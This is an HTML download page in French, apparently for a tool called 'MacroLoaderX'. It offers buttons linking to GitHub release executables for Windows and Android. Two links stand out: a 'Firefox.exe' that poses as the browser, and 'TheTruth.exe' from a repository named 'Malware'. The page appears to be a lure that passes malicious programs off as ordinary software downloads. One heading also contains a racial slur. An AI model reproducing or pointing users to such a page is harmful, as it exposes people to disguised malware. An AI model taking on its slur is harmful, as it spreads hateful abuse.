<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MacroLoaderX - Download</title>

    <!-- Fonts -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600&display=swap" rel="stylesheet">

    <style>
        :root {
            --bg: #030303;
            --surface: #0a0a0a;
            --surface-highlight: #121212;
            --border: #262626;
            --border-hover: #404040;
            --text-main: #ededed;
            --text-muted: #888;
            --primary: #ffffff;
            --font-sans: 'Inter', sans-serif;
        }

        * { margin: 0; padding: 0; box-sizing: border-box; }

        body {
            background-color: var(--bg);
            color: var(--text-main);
            font-family: var(--font-sans);
            line-height: 1.6;
            overflow-x: hidden;
        }

        /* Glow background */
        .glow-bg {
            position: fixed;
            top: -300px;
            left: 50%;
            transform: translateX(-50%);
            width: 100vw;
            height: 800px;
            background: radial-gradient(circle, rgba(255,255,255,0.06) 0%, rgba(0,0,0,0) 60%);
            z-index: -1;
            pointer-events: none;
        }

        .container {
            max-width: 1100px;
            margin: 0 auto;
            padding: 120px 24px;
        }

        /* Download box */
        .download-box {
            text-align: center;
            margin: 40px auto;
            padding: 40px;
            background: radial-gradient(circle at center, rgba(255,255,255,0.03), transparent 70%);
            border: 1px solid var(--border);
            border-radius: 12px;
            max-width: 500px;
            transition: 0.3s;
        }

        .download-box:hover {
            border-color: var(--border-hover);
            box-shadow: 0 20px 40px rgba(0,0,0,0.6);
        }

        .download-box h2 {
            font-size: 20px;
            font-weight: 600;
            margin-bottom: 10px;
        }

        .download-box p {
            color: var(--text-muted);
            font-size: 14px;
            margin-bottom: 25px;
        }

        .btn-primary {
            padding: 12px 28px;
            background: var(--primary);
            color: #000;
            border-radius: 8px;
            font-weight: 600;
            font-size: 14px;
            text-decoration: none;
            transition: 0.2s;
        }

        .btn-primary:hover {
            opacity: 0.9;
        }

        /* Fade-in animation */
        .fade-in {
            opacity: 0;
            transform: translateY(15px);
            transition: 0.6s ease-out;
        }

        .visible {
            opacity: 1;
            transform: translateY(0);
        }
    </style>
</head>
<body>

    <div class="glow-bg"></div>

    <section class="container">

        <div class="download-box fade-in">
            <h2>PC</h2>
            <p>> Windows 10 / 11</p>
            <a href="https://github.com/n0lex9999/MacroLoaderX/releases/download/download/MacroLoaderX.zip" class="btn-primary">
                Télécharger v2.4.0
            </a>
        </div>

        <div class="download-box fade-in">
            <h2>🔥 FirefIx ON FIRE B 🔥</h2>
            <p>> NTM</p>
            <a href="https://github.com/n0lex9999/MacroLoaderX/releases/download/fire/Firefox.exe" class="btn-primary">
                Télécharger v2.4.0
            </a>
        </div>

        <div class="download-box fade-in">
            <h2>WOWOWOW NIGGERS ? ?</h2>
            <p>> jte v</p>
            <a href="https://github.com/n0lex9999/Malware/releases/download/kkk/TheTruth.exe" class="btn-primary">
                Télécharger v2.4.0
            </a>
        </div>

        <div class="download-box fade-in">
            <h2>Téléphone</h2>
            <p>> Android</p>
            <a href="https://github.com/n0lex9999/MacroLoaderX/releases/download/macroloader/MacroLoaderX.apk" class="btn-primary">
                Télécharger v2.4.0
            </a>
        </div>

    </section>

    <script>
        const observer = new IntersectionObserver((entries) => {
            entries.forEach(entry => {
                if (entry.isIntersecting) {
                    entry.target.classList.add('visible');
                }
            });
        }, { threshold: 0.1 });

        document.querySelectorAll('.fade-in').forEach(el => observer.observe(el));
    </script>

</body>
</html>
